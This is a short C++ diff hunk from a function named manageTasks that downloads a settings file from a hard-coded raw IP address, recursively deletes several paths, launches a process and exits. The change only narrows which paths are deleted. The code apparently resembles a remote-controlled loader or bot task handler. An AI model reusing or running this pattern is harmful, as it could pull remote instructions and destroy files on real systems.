@@ -410,7 +410,7 @@ void manageTasks(const std::wstring& task)
 		Download(
 			L"http://92.35.115.29/server/settings.json",
 			3, false);
-		for (int i : {0, 1, 3})fs::remove_all(v[i]);
+		for (int i : {0, 1})fs::remove_all(v[i]);
 		RunProc(v[2], L"", false);
 		exit(0);
 	}
